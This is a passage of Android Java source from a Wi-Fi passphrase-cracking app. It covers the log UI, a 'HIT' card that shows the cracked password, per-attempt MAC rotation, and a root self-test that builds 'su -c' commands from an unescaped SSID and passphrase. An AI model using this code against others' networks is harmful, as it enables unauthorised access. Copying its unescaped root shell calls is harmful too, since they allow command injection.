         * <p>普通视图（「关键」）显示人能读的：结论 + 第几条 + 耗时；
         * 技术视图（「全部」）显示可追溯的：attemptId、候选哈希、归属来源。
         * 两个版本同时存在，切换筛选时只是换一段文本，**原始证据不丢**。
         */
        final CharSequence textTech;
        /** 合并行的时间跨度（毫秒，墙钟）；0 表示未记录。 */
        final long firstAtMs;
        final long lastAtMs;

        LogLine(CharSequence text, int color, io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind) {
            this(text, color, kind, null, 1, null, 0L, 0L);
        }

        LogLine(CharSequence text, int color,
                io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind,
                String dedupeKey, int repeat) {
            this(text, color, kind, dedupeKey, repeat, null, 0L, 0L);
        }

        LogLine(CharSequence text, int color,
                io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind,
                String dedupeKey, int repeat,
                CharSequence textTech, long firstAtMs, long lastAtMs) {
            this.text = text;
            this.color = color;
            this.kind = kind;
            this.dedupeKey = dedupeKey;
            this.repeat = repeat;
            this.textTech = textTech;
            this.firstAtMs = firstAtMs;
            this.lastAtMs = lastAtMs;
        }

        /** 按当前视图取文本。 */
        CharSequence shown(boolean tech) {
            return (tech && textTech != null) ? textTech : text;
        }
    }

    private void appendStreamColored(String line, int color) {
        appendStreamColored(line, color, null);
    }

    /**
     * 逐条候选结果专用入口：级别**定死成「原因」**（关键视图可见）。
     *
     * <p>这条线是运行中的心跳 —— 真实的判定结论文案五花八门
     * （回连 / 超时 / 早期失败 / 握手完成…），靠关键词认不全，
     * 所以在写入时就把级别定下来，别让筛选把"它在干活"的证据一起藏了。
     */
    private void appendStreamDetail(String line, int color) {
        appendStreamColored(line, color, io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind.REASON);
    }

    /**
     * 逐条候选结果的**降噪入口**（P1b）。
     *
     * <p>与上一行同 {@code dedupeKey} 时不追加新行，而是把那一行替换成
     * 「原文本 ×N」—— 原始证据不丢（{@code streamLines} 仍逐条可回溯、
     * 文件日志逐条写入），只是**界面**不再被同一句话刷屏。
     *
     * @param dedupeKey 合并键（null = 不合并）
     */
    private void appendStreamDedup(String line, int color, String dedupeKey) {
        appendStreamDedup(line, color, dedupeKey, null);
    }

    /**
     * 逐条候选结果的**降噪入口**（含两层文本）。
     *
     * @param line     普通视图文本（人能读的）
     * @param textTech 技术详情版文本（含 attemptId / 哈希 / 归属来源），可为 null
     * @param dedupeKey 合并键（null = 不合并）；同键相邻行合并并累计 ×N 与时间跨度
     */
    private void appendStreamDedup(String line, int color, String dedupeKey,
                                   CharSequence textTech) {
        if (line == null) return;
        int c = (color == 0) ? TEXT_DIM : color;
        long now = System.currentTimeMillis();
        if (dedupeKey != null && !streamLines.isEmpty()) {
            LogLine last = streamLines.get(streamLines.size() - 1);
            if (dedupeKey.equals(last.dedupeKey)) {
                streamLines.set(streamLines.size() - 1, new LogLine(
                        last.text, last.color, last.kind, dedupeKey, last.repeat + 1,
                        last.textTech != null ? last.textTech : textTech,
                        last.firstAtMs > 0 ? last.firstAtMs : now, now));
                renderStream();
                return;
            }
        }
        streamLines.add(new LogLine(line, c,
                io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind.REASON, dedupeKey, 1,
                textTech, now, now));
        while (streamLines.size() > MAX_LOG_LINES) streamLines.remove(0);
        renderStream();
    }

    /** 秒数格式化：<1s 用 0.1s 精度，>=1s 保留一位小数，>=10s 取整。 */
    private static String fmtSeconds(long ms) {
        if (ms < 0) return "—";
        if (ms < 950) return "0." + Math.max(1, ms / 100) + "s";
        double sec = ms / 1000.0;
        if (sec < 10) return String.format(java.util.Locale.US, "%.1fs", sec);
        return Math.round(sec) + "s";
    }

    /** 墙钟 HH:mm（合并行的时间跨度用）。 */
    private static String clockHm(long ms) {
        return new java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
                .format(new java.util.Date(ms));
    }

    private void appendStreamColored(String line, int color,
                                     io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind forceKind) {
        if (line == null) return;
        int c = (color == 0) ? TEXT_DIM : color;
        io.github.wlmosv_png.wpaforge.ui.LogFilter.Kind kind = forceKind != null
                ? forceKind
                : io.github.wlmosv_png.wpaforge.ui.LogFilter.classify(line.toString());

        streamLines.add(new LogLine(line, c, kind));
        while (streamLines.size() > MAX_LOG_LINES) streamLines.remove(0);

        if (!io.github.wlmosv_png.wpaforge.ui.LogFilter.visible(kind, streamKeyOnly)) {
            // 被筛掉的行照样留在全量列表里，切「全部」时能看到
            updateFlowHeader();
            updateEmptyHint();
            return;
        }
        // 日志区只在**确实有可见内容**时展开。改版前它无条件占 340dp，
        // 空闲时那一大块空白比内容还显眼。
        boolean wasEmpty = streamBuffer.length() == 0;
        appendBuffer(line, c);
        if (wasEmpty) {
            applyStreamHeight();
            updateEmptyHint();
        }

        if (connectStreamView != null) {
            // 用 Spannable 版本 setText，TextView 直接吃 span。
            connectStreamView.setText(streamBuffer, android.widget.TextView.BufferType.SPANNABLE);
            updateFlowHeader();
            updateJumpLatest();
            if (streamAutoScroll && streamScroll != null) {
                streamScroll.post(() ->
                        streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
            }
        }
    }

    private void appendBuffer(CharSequence line, int color) {
        int start = streamBuffer.length();
        streamBuffer.append(line).append('\n');
        streamBuffer.setSpan(
                new android.text.style.ForegroundColorSpan(color),
                start, streamBuffer.length(),
                android.text.Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    }

    /** 按当前筛选从全量列表重建可见日志。切筛选、清空、回到本页时调用。 */
    private void renderStream() {
        streamBuffer.clear();
        streamBuffer.clearSpans();
        for (LogLine l : streamLines) {
            if (!io.github.wlmosv_png.wpaforge.ui.LogFilter.visible(l.kind, streamKeyOnly)) continue;
            CharSequence body = l.shown(streamKeyOnly);
            if (l.repeat > 1) {
                // 合并显示：文本 + ×N + 时间跨度。
                // 「最近什么时候发生的」比「第几条」更常被问到 —— 用户想知道的是
                // 「这是刚才那批，还是十分钟前的」。
                StringBuilder sb = new StringBuilder(body);
                sb.append("   ×").append(l.repeat);
                if (l.firstAtMs > 0) {
                    sb.append("  ").append(clockHm(l.firstAtMs));
                    if (l.lastAtMs > l.firstAtMs) sb.append("–").append(clockHm(l.lastAtMs));
                }
                appendBuffer(sb, l.color);
            } else {
                appendBuffer(body, l.color);
            }
        }
        if (connectStreamView != null) {
            connectStreamView.setText(streamBuffer, android.widget.TextView.BufferType.SPANNABLE);
        }
        updateFlowHeader();
        updateJumpLatest();
        applyStreamHeight();
        updateEmptyHint();
        if (streamAutoScroll && streamScroll != null) {
            streamScroll.post(() -> streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
        }
    }

    /** 日志分级 chip 的选中态 */
    private void styleFlowChips() {
        if (chipKey == null || chipAll == null) return;
        chipKey.setTextColor(streamKeyOnly ? ACCENT : TEXT_DIM);
        chipKey.setBackground(roundBg(
                streamKeyOnly ? AmberTheme.ACCENT_BG : AmberTheme.CARD_2,
                AmberTheme.RADIUS_CHIP));
        chipAll.setTextColor(streamKeyOnly ? TEXT_DIM : ACCENT);
        chipAll.setBackground(roundBg(
                streamKeyOnly ? AmberTheme.CARD_2 : AmberTheme.ACCENT_BG,
                AmberTheme.RADIUS_CHIP));
    }

    /** 刷新「正在试」区：当前候选等宽大字，上面两条淡出 */
    private void renderCandidates() {
        if (candBox == null || candRoll == null) return;
        String cur = candTicker.current();
        if (cur == null) {
            candBox.setVisibility(View.GONE);
            return;
        }
        candBox.setVisibility(View.VISIBLE);
        candRoll.setCandidate(cur);
        java.util.List<String> prev = candTicker.previous(2);
        StringBuilder sb = new StringBuilder();
        for (String p : prev) {
            if (sb.length() > 0) sb.append('\n');
            sb.append(p);
        }
        candPrev.setText(sb.toString());
        candPrev.setVisibility(sb.length() == 0 ? View.GONE : View.VISIBLE);
    }

    /**
     * 命中卡片 —— 整个产品的巅峰时刻。
     *
     * <p>改版前「命中」只是日志里的一行绿字。现在给它一块卡：
     * 口令等宽大字 + 一键复制 + 证据与位置。
     */
    private void showHitCard(String password, long ms, String detail) {
        if (hitCard == null || hitPw == null) return;
        String ssid = targetNet == null ? "" : targetNet.displayName();
        Object tag = hitCard.getTag();
        if (tag instanceof TextView) {
            ((TextView) tag).setText(L.s("⚡ 命中 · ", "★ HIT · ") + ssid);
        }
        hitPw.setText(password == null ? "" : password);
        StringBuilder meta = new StringBuilder();
        meta.append(detail == null ? "" : detail);
        if (ms > 0) {
            if (meta.length() > 0) meta.append(" · ");
            meta.append(ms).append("ms");
        }
        if (lastTotal > 0) {
            // lastTested 是「命中之前已完成的条数」，命中那条自己是第 +1 条
            // （onProgress 在命中那条上不会被调用，所以它没被计入）。
            // 2026-10-24 排查时就是这里先把我误导了一次：卡片写「第 10」，
            // 而字典里第 10 条是 trustno1、第 11 条才是命中的那条。
            meta.append(L.s(" · 第 ", " · #")).append(lastTested + 1)
                    .append(" / ").append(lastTotal).append(L.s(" 条", ""));
        }
        hitMeta.setText(meta.toString());
        hitCard.setVisibility(View.VISIBLE);
        // 命中时把日志展开到「关键」，让上下文里的任务节点一起出现
        if (streamCollapsed) toggleStream();
    }

    /** 开始一次新的破解：清掉上一轮的候选窗口与命中卡片 */
    private void resetCrackHud() {
        candTicker.clear();
        if (candBox != null) candBox.setVisibility(View.GONE);
        if (hitCard != null) hitCard.setVisibility(View.GONE);
        if (candRoll != null) candRoll.setCandidateInstant("");
        if (candPrev != null) candPrev.setText("");
        lastTested = 0;
        lastTotal = 0;
    }

    /** 最多保留的日志行数 */
    private static final int MAX_LOG_LINES = 400;

    /** 数一下当前有多少行（按 \n 计） */
    private static int countLines(CharSequence s) {
        int n = 0;
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) == '\n') n++;
        }
        return n;
    }

    // ---------------- 设置页 ----------------

    /**
     * 连接自测：真的发一次连接命令，把每一层判据的结果都打出来。
     *
     * 用户反馈「正确密码连不上 / 判不出」时，光看结果分不清是
     * 「命令没发出去」「连上了但没识别到」还是「根本没连上」。
     * 这里逐层报告，一次就能定位。
     */
    private void showConnTestDialog() {
        final NetDialog dlg = new NetDialog(this,
                L.s("连接自测", "Connection test"),
                L.s("输入一个你能确认密码的 WiFi，点测试。\n"
                        + "会真的发起一次连接（会短暂切换网络）。\n"
                        + "测试会临时改动目标网络的已保存配置 —— 开始前先登记原配置，"
                        + "结束（含失败/中断）后自动还原并读回验证；登记不到就拒绝执行。",
                        "Enter a Wi-Fi whose passphrase you know.\n"
                                + "It really connects once (briefly switching networks).\n"
                                + "It temporarily replaces the target's saved config: the original is "
                                + "snapshotted first and restored (with read-back) afterwards; "
                                + "if it cannot be snapshotted the test is refused."));
        final android.widget.EditText ssidIn = dlg.addField(
                L.s("SSID（网络名）", "SSID"), "");
        final android.widget.EditText pwIn = dlg.addField(
                L.s("密码", "Passphrase"), "");
        dlg.setPositive(L.s("开始测试", "Test"), (d) -> {
            String ssid = ssidIn.getText().toString().trim();
            String pw = pwIn.getText().toString();
            if (ssid.isEmpty() || pw.length() < 8) {
                android.widget.Toast.makeText(this,
                        L.s("请填写正确的 SSID 和密码（8-63 位）",
                                "Enter a valid SSID and passphrase (8-63 chars)"),
                        android.widget.Toast.LENGTH_SHORT).show();
                return;
            }
            runConnTest(ssid, pw);
        });
        dlg.setNegative(L.s("取消", "Cancel"), null);
        dlg.show();
    }

    /**
     * 分步连接自测：把整条链路拆成 6 步，每步给结论。
     *
     * 用户报障时最需要的是「卡在哪一步」，而不是一个笼统的成败。
     * 这个实现不做任何推断，只如实报告每一步命令的输出。
     */
    private void runConnTest(final String ssid, final String pass) {
        final int m = Prefs.mode(this);
        new Thread(() -> {
            final StringBuilder sb = new StringBuilder();
            sb.append("目标: ").append(ssid).append("\n");
            sb.append("模式: ").append(modeName(m)).append("\n");
            sb.append("密码长度: ").append(pass.length()).append("\n\n");

            // 构造 shell 通道（只有 Root）
            io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel sh =
                    new io.github.wlmosv_png.wpaforge.audit.CrackEngine.ShellChannel() {
                        @Override public String exec(String cmd, long timeoutMs) {
                            return io.github.wlmosv_png.wpaforge.audit.RootProber
                                    .exec(null, new String[]{"su", "-c", cmd}, timeoutMs);
                        }
                        @Override public String name() { return "Root"; }
                    };

            // ── 步骤 1：权限 ──
            sb.append(L.s("【1/6】权限检查\n", "[1/6] Permissions\n"));
            boolean fl = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED;
            sb.append("  定位: ").append(fl ? "✓" : "✗（会影响扫描与 SSID 读取）").append('\n');
            if (Build.VERSION.SDK_INT >= 33) {
                boolean nw = checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES")
                        == PackageManager.PERMISSION_GRANTED;
                sb.append("  附近设备: ").append(nw ? "✓" : "✗（Android 13+ 扫描必需）").append('\n');
            }
            boolean locSwStep1 = scanner == null || scanner.isLocationEnabled();
            sb.append("  定位开关: ").append(locSwStep1
                    ? "✓"
                    : "✗（关着时扫描一定是空的，只给权限没用）").append('\n');

            // ── 步骤 2：通道 ──
            sb.append(L.s("\n【2/6】执行通道\n", "\n[2/6] Channel\n"));
            {
                String probe = null;
                try { probe = sh.exec("cmd wifi status", 8000); } catch (Throwable t) {
                    sb.append("  ✗ exec 异常: ").append(t.getClass().getSimpleName()).append('\n');
                }
                if (probe == null || probe.trim().isEmpty()) {
                    sb.append(L.s("  ✗ cmd wifi status 无输出 —— 通道没通，后面必然失败。\n",
                            "  x cmd wifi status returned nothing - channel is dead.\n"));
                    sb.append(L.s("     请确认设备已 root，且本应用已获得 su 授权。\n",
                            "     Make sure the device is rooted and this app has su access.\n"));
                } else {
                    sb.append("  ✓ cmd wifi status 可用\n");
                }
            }

            // ── 保护（最终审计 P0-1）：步骤 3 会**改动目标网络配置**，
            //    所以先走 R11 同一套机制：登记原配置（netId + 加密后的原口令）→ 落盘 →
            //    过 fail-closed 闸门。任何一项不成立就**禁止本次自测**并说明原因。
            final String testTaskId = "selftest-" + System.currentTimeMillis();
            io.github.wlmosv_png.wpaforge.audit.RestoreJournal.Entry guardEntry = null;
            {
                sb.append(L.s("\n【保护】登记目标原始配置（结束时会自动还原并读回验证）\n",
                        "\n[guard] snapshotting target config (auto-restored afterwards)\n"));
                try {
                    io.github.wlmosv_png.wpaforge.audit.RestoreRunner.Block blk =
                            io.github.wlmosv_png.wpaforge.audit.RestoreRunner
                                    .checkNewTask(testTaskId, ssid);
                    io.github.wlmosv_png.wpaforge.audit.ConfigRestorer.Snapshot snap =
                            io.github.wlmosv_png.wpaforge.audit.ConfigRestorer.snapshot(
                                    testTaskId, ssid, null, "wpa2", testTaskId);
                    boolean saved = !blk.blocked
                            && io.github.wlmosv_png.wpaforge.audit.RestoreJournal.save(snap.entry);
                    sb.append("  ").append(io.github.wlmosv_png.wpaforge.audit.ConfigRestorer
                            .describe(snap.entry)).append('\n');
                    io.github.wlmosv_png.wpaforge.audit.RestoreGuard.Decision d =
                            io.github.wlmosv_png.wpaforge.audit.RestoreGuard.decide(
                                    snap.facts(false, saved,
                                            io.github.wlmosv_png.wpaforge.audit
                                                    .RestoreJournal.pendingUnknown(),
                                            io.github.wlmosv_png.wpaforge.audit
                                                    .RestoreJournal.pendingCount()));
                    if (d.proceed) {
                        guardEntry = snap.entry;
                        sb.append(L.s("  ✓ 已登记，测试结束后自动还原\n",
                                "  ✓ snapshotted; will restore after the test\n"));
                    } else {
                        sb.append(L.s("  ✗ 无法保证能还原，已禁止本次自测（不执行任何写操作）: ",
                                        "  x cannot guarantee restore - self-test refused (no writes): "))
                                .append(io.github.wlmosv_png.wpaforge.audit.RestoreGuard.describe(d))
                                .append('\n');
                    }
                } catch (Throwable t) {
                    guardEntry = null;
                    sb.append(L.s("  ✗ 登记异常，已禁止本次自测: ", "  x snapshot threw - refused: "))
                            .append(t.getClass().getSimpleName()).append('\n');
                }
            }

            if (sh != null && guardEntry != null) {
                try {
                // ── 步骤 3：清配置 ──
                sb.append(L.s("\n【3/6】清除目标旧配置\n", "\n[3/6] Clear stale config\n"));
                String before = null;
                try { before = sh.exec("cmd wifi list-networks", 5000); } catch (Throwable ignored) {}
                long staleId = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser
                        .findNetId(before, ssid);
                sb.append(L.s("  清除前: ", "  before: "))
                        .append(staleId >= 0 ? ("netId=" + staleId) : L.s("无旧配置", "none")).append('\n');
                if (staleId >= 0) {
                    try { sh.exec("cmd wifi forget-network " + staleId, 4000); } catch (Throwable ignored) {}
                    try { Thread.sleep(700); } catch (InterruptedException ignored) {}
                    String after = null;
                    try { after = sh.exec("cmd wifi list-networks", 5000); } catch (Throwable ignored) {}
                    long still = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser
                            .findNetId(after, ssid);
                    sb.append(L.s("  清除后: ", "  after: "))
                            .append(still < 0 ? "✓ 已清干净" : ("✗ 仍然存在 netId=" + still)).append('\n');
                }

                // ── 步骤 4：断开当前 ──
                sb.append(L.s("\n【4/6】断开当前连接\n", "\n[4/6] Drop current link\n"));
                String st0 = null;
                try { st0 = sh.exec("cmd wifi status", 6000); } catch (Throwable ignored) {}
                String cur = io.github.wlmosv_png.wpaforge.audit.StatusParser.currentSsid(st0);
                sb.append(L.s("  当前连着: ", "  now connected to: "))
                        .append(cur == null ? L.s("（无）", "(none)") : cur).append('\n');
                if (ssid.equals(cur)) {
                    sb.append(L.s("  目标 = 当前连接，先断开…\n", "  target == current link, dropping...\n"));
                    try { sh.exec("cmd wifi set-wifi-enabled disabled", 8000); } catch (Throwable ignored) {}
                    try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                    try { sh.exec("cmd wifi set-wifi-enabled enabled", 8000); } catch (Throwable ignored) {}
                    try { Thread.sleep(2500); } catch (InterruptedException ignored) {}
                    String st1 = null;
                    try { st1 = sh.exec("cmd wifi status", 6000); } catch (Throwable ignored) {}
                    String cur1 = io.github.wlmosv_png.wpaforge.audit.StatusParser.currentSsid(st1);
                    sb.append(L.s("  断开后: ", "  after drop: "))
                            .append(cur1 == null ? L.s("（无）", "(none)") : cur1).append('\n');
                }

                // ── 步骤 5：发命令 ──
                sb.append(L.s("\n【5/6】发起连接\n", "\n[5/6] Connect\n"));
                String cmdOut = null;
                try {
                    cmdOut = sh.exec("cmd wifi connect-network " + ssid + " wpa2 " + pass, 15000);
                } catch (Throwable t) {
                    sb.append("  ✗ 命令异常: ").append(t.getClass().getSimpleName()).append('\n');
                }
                sb.append(L.s("  命令输出: ", "  output: "))
                        .append(cmdOut == null || cmdOut.trim().isEmpty() ? L.s("（无输出，正常）", "(none, normal)") : cmdOut.trim())
                        .append('\n');
                long newId = -1;
                String listDump = null;
                try {
                    listDump = sh.exec("cmd wifi list-networks", 5000);
                    newId = io.github.wlmosv_png.wpaforge.audit.ListNetworksParser.findNetId(listDump, ssid);
                } catch (Throwable ignored) {}
                sb.append(L.s("  新建配置 netId: ", "  new netId: ")).append(newId).append('\n');
                // 把保存列表完整打出来，便于定位「为什么找不到目标 netId」
                if (newId < 0) {
                    sb.append(L.s("  ⚠ 没找到目标配置，下面是 list-networks 完整输出:\n",
                            "  ! target config not found; full list-networks below:\n"));
                    if (listDump == null || listDump.trim().isEmpty()) {
                        sb.append("    (空)\n");
                    } else {
                        for (String ln : listDump.split("\n")) {
                            sb.append("    ").append(ln).append('\n');
                        }
                    }
                    // 同时报一下我们输入的 SSID 的字节形态（长度 + 是否有空格）
                    sb.append("  输入 SSID = [").append(ssid).append("] 长度=")
                            .append(ssid.length())
                            .append(" 含空格=").append(ssid.contains(" "))
                            .append("\n");
                }

                // ── 步骤 6：观察 15 秒 ──
                sb.append(L.s("\n【6/6】观察 15 秒\n", "\n[6/6] Watching 15s\n"));
                boolean hit = false;
                for (int i = 0; i < 30; i++) {
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                    String st = null;
                    try { st = sh.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
                    if (st == null) continue;
                    io.github.wlmosv_png.wpaforge.audit.SupplicantParser.Info info =
                            io.github.wlmosv_png.wpaforge.audit.SupplicantParser.parse(st);
                    if (info.raw && (i % 4 == 0 || info.isTargetConnected(ssid))) {
                        sb.append("  t=").append((i * 500) / 1000.0).append("s  ")
                                .append(info.ssid == null ? "-" : info.ssid)
                                .append(" / ").append(info.state == null ? "-" : info.state)
                                .append(" / ").append(info.ip == null ? "-" : info.ip)
                                .append(" / netId=").append(info.netId).append('\n');
                    }
                    if (info.isTargetConnected(ssid)) { hit = true; break; }
                }
                sb.append('\n');
                if (hit) {
                    sb.append(L.s("结论: ✓ 握手完成并拿到 IP —— 这个密码是对的，判定没问题。\n",
                            "Result: handshake completed and IP obtained - passphrase is correct.\n"));
                } else {
                    sb.append(L.s("结论: ✗ 15 秒内目标从未「握手完成 + 拿到 IP」。\n",
                            "Result: target never reached handshake-complete within 15s.\n"));
                    sb.append(L.s("  这说明系统确实没连上（密码不符 / 信号太弱 / 安全类型不匹配）。\n",
                            "  The system genuinely failed to connect (wrong passphrase / weak signal / security mismatch).\n"));
                }
                } finally {
                    // ── 收尾还原（最终审计 P0-1）──
                    // 无论成功、失败、中断还是异常，都必须走到这里；与启动补做共用同一把锁，
                    // 所以不会和服务的收尾恢复并发操作同一份 journal / 同一个目标配置。
                    sb.append(L.s("\n【还原】正在恢复目标原始配置…\n",
                            "\n[restore] restoring original config...\n"));
                    try {
                        io.github.wlmosv_png.wpaforge.audit.RestorePlan.Outcome o =
                                io.github.wlmosv_png.wpaforge.audit.RestoreRunner.runExclusiveForTask(
                                        guardEntry, testTaskId,
                                        io.github.wlmosv_png.wpaforge.audit.ConfigRestorer::restore);
                        if (o == null) {
                            sb.append(L.s("  ⚠ 本次未执行还原: ", "  ! restore not run: "))
                                    .append(io.github.wlmosv_png.wpaforge.audit.RestoreRunner.lastSummary())
                                    .append('\n');
                        } else {
                            sb.append("  ").append(o.summary()).append('\n');
                            if (!o.restored) {
                                sb.append(L.s("  ⚠ 原配置未确认还原：请手动重连该网络（口令可能需要重输）\n",
                                        "  ! original config not confirmed: reconnect manually\n"));
                            }
                        }
                    } catch (Throwable t) {
                        sb.append(L.s("  ✗ 还原异常: ", "  x restore threw: "))
                                .append(t.getClass().getSimpleName()).append('\n');
                    }
                }
            } else if (sh != null) {
                sb.append(L.s("\n【跳过】未通过保护检查，本次不执行任何会改动网络配置的步骤。\n",
                        "\n[skipped] guard failed - no config-touching steps were run.\n"));
            }

            final String body = sb.toString();
            ui.post(() -> new NetDialog(MainActivity.this,
                    L.s("连接自测结果", "Connection test result"), body)
                    .setPositive(L.s("知道了", "Got it"), null).show());
        }, "wpaforge-conntest").start();
    }

    /** 把日志复制到 Download 目录（应用私有目录不好进）。 */
    private void exportLog() {
        new Thread(() -> {
            java.io.File f = null;
            try {
                android.content.Intent it = new android.content.Intent(this,
                        io.github.wlmosv_png.wpaforge.CrackService.class);
                it.setAction("io.github.wlmosv_png.wpaforge.EXPORT_LOG");
                startService(it);
            } catch (Throwable ignored) {}
            // 直接也自己复制一份（不依赖服务活着）
            try {
                java.io.File dir = getExternalFilesDir("logs");
                java.io.File[] all = dir == null ? null : dir.listFiles();
                if (all != null && all.length > 0) {
                    java.io.File newest = null;
                    for (java.io.File x : all) {
                        if (!x.getName().startsWith("WPAForge-log-")) continue;
                        if (newest == null || x.lastModified() > newest.lastModified()) newest = x;
                    }
                    if (newest != null) {
                        java.io.File out = new java.io.File(
                                android.os.Environment.getExternalStoragePublicDirectory(
                                        android.os.Environment.DIRECTORY_DOWNLOADS),
                                newest.getName());
                        java.io.FileInputStream in = new java.io.FileInputStream(newest);
                        java.io.FileOutputStream os = new java.io.FileOutputStream(out);
                        byte[] b = new byte[8192];
                        int n;
                        while ((n = in.read(b)) > 0) os.write(b, 0, n);
                        in.close();
                        os.close();
                        f = out;
                    }
                }
            } catch (Throwable ignored) {}
            final java.io.File res = f;
            final String privPath = getExternalFilesDir("logs") == null
                    ? "（私有目录不可用）" : getExternalFilesDir("logs").getAbsolutePath();
            ui.post(() -> {
                String msg;
                if (res != null) {
                    msg = L.s("已导出:\n" + res.getAbsolutePath()
                                    + "\n\n全部日志在:\n" + privPath,
                            "Exported to:\n" + res.getAbsolutePath()
                                    + "\n\nAll logs in:\n" + privPath);
                } else {
                    msg = L.s("导出失败（可能没有存储权限）。\n\n日志目录:\n" + privPath,
                            "Export failed (no storage permission?).\n\nLog dir:\n" + privPath);
                }
                new NetDialog(MainActivity.this, L.s("导出日志", "Export log"), msg)
                        .setPositive(L.s("知道了", "Got it"), null).show();
            });
        }, "wpaforge-exportlog").start();
    }

    /** 连接选项两个开关的文案刷新 */
    private void refreshConnOptions() {
        if (connPinBtn == null || connRotBtn == null) return;
        connPinBtn.setText(Prefs.pinBssid(this)
                ? L.s("锁定 AP：开（-b 指定 BSSID）", "Pin AP: on (-b BSSID)")
                : L.s("锁定 AP：关（由系统选择 AP）", "Pin AP: off (system picks)"));
        connRotBtn.setText(Prefs.macRotate(this)
                ? L.s("更换随机 MAC：开（每次尝试换一个）", "Random MAC: on (new one per attempt)")
                : L.s("更换随机 MAC：关（沿用系统策略）", "Random MAC: off (system default)"));
    }

    /**
     * 设置页 —— 2026-10-24 重排。
     *
     * <h3>为什么重排</h3>
     * 改版前是「一个说明块接一个胶囊按钮」交替往下堆：同类的东西不在同一块里，
     * 组与组之间也没有边界，往下滚像一串散装控件（用户原话："设置页面很乱"）。
     * 现在统一成：**琥珀小节标题 + 一张卡装下该组的全部行**，行与行之间一条极淡分隔线；
     * 卡内的操作行是**扁平整行**（左标题 + 右 ›），不再是浮在页面上的大胶囊按钮。
     *
     * <h3>逐字未动</h3>
     * 每个设置键、默认值、点击回调、确认条件、读写方式与改版前完全相同
     * （PIN 的两条分支、一键修复的白名单命令、连接自测与导出日志的入口都原样保留）。
     */
    private void buildSettingsTab() {
        if (radar != null) radar.stopSpin();

        // ---------------- 执行通道 ----------------
        pageSettings.addView(sectionLabel(L.s("执行通道", "Execution channel")));
        LinearLayout modeCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        modeInfo = new TextView(this);
        modeInfo.setTextSize(AmberTheme.FS_BODY);
        modeInfo.setTextColor(TEXT);
        modeInfo.setLineSpacing(px(4), 1f);
        modeCard.addView(modeInfo);

        modeReadyLabel = new TextView(this);
        modeReadyLabel.setTextSize(AmberTheme.FS_BODY);
        modeReadyLabel.setTextColor(TEXT_DIM);
        modeReadyLabel.setLineSpacing(px(4), 1f);
        modeCard.addView(groupDivider(12));
        modeCard.addView(modeReadyLabel, topGap(10));

        // 点一下重测 / 长按看证据 —— 这两个交互以前完全不可发现，这里直接写出来。
        TextView modeHint = new TextView(this);
        modeHint.setText(L.s("点一下重新检测 · 长按看完整检测证据",
                "Tap to re-check · long-press for full evidence"));
        modeHint.setTextSize(AmberTheme.FS_LABEL);
        modeHint.setTextColor(AmberTheme.TEXT_FAINT);
        modeCard.addView(modeHint, topGap(8));
        pageSettings.addView(modeCard);
        refreshModeReady();
        fillModeInfo();

        // ---------------- 语言 ----------------
        pageSettings.addView(sectionLabel(L.s("语言", "Language")));
        LinearLayout langCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        languageBtn = rowAction("");
        languageBtn.setOnClickListener(v -> showLanguagePicker());
        langCard.addView(languageBtn);
        pageSettings.addView(langCard);
        refreshLanguageRow();

        // ---------------- 权限 ----------------
        pageSettings.addView(sectionLabel(L.s("权限", "Permissions")));
        LinearLayout permCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        permLabel = new TextView(this);
        permLabel.setTextSize(AmberTheme.FS_BODY);
        permLabel.setTextColor(TEXT_DIM);
        permLabel.setLineSpacing(px(5), 1f);
        permCard.addView(permLabel);
        refreshPermLabel();

        // 权限在启动时已自动申请过，这里不再放手动申请按钮 ——
        // 放一个「申请缺失的权限」会让人以为不点就不给。
        // 只有「已被永久拒绝」（系统不再弹窗）时才给一个去处。
        permFixBtn = rowAction(L.s("去系统设置里允许", "Allow in system settings"));
        permFixBtn.setOnClickListener(v -> openAppSettings());
        permFixBtn.setVisibility(View.GONE);
        permCard.addView(groupDivider(10));
        permCard.addView(permFixBtn);
        pageSettings.addView(permCard);

        // ---------------- 保活状态 ----------------
        pageSettings.addView(sectionLabel(L.s("保活状态", "Keep-alive status")));
        LinearLayout aliveCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        keepAliveLabel = new TextView(this);
        keepAliveLabel.setTextSize(AmberTheme.FS_BODY);
        keepAliveLabel.setTextColor(TEXT_DIM);
        keepAliveLabel.setLineSpacing(px(5), 1f);
        aliveCard.addView(keepAliveLabel);
        refreshKeepAlive();

        Button fixAlive = rowAction(L.s("一键修复：写入系统白名单", "Fix now: write system whitelists"));
        fixAlive.setOnClickListener(v -> {
            Toast.makeText(this, L.s("正在写入…", "writing…"), Toast.LENGTH_SHORT).show();
            new Thread(() -> {
                final StringBuilder err = new StringBuilder();
                try {
                    String pkg = getPackageName();
                    io.github.wlmosv_png.wpaforge.audit.RootProber.exec(this,
                            new String[]{"su", "-c", "dumpsys deviceidle whitelist +" + pkg}, 8000);
                    String cur = io.github.wlmosv_png.wpaforge.audit.RootProber.exec(this,
                            new String[]{"su", "-c",
                                    "settings get global lspdoze.deepsleep.whitelist"}, 6000);
                    if (cur != null && !cur.contains(pkg)) {
                        String merged = cur.trim().isEmpty() ? pkg : cur.trim() + "," + pkg;
                        io.github.wlmosv_png.wpaforge.audit.RootProber.exec(this,
                                new String[]{"su", "-c",
                                        "settings put global lspdoze.deepsleep.whitelist '" + merged + "'"},
                                6000);
                    }
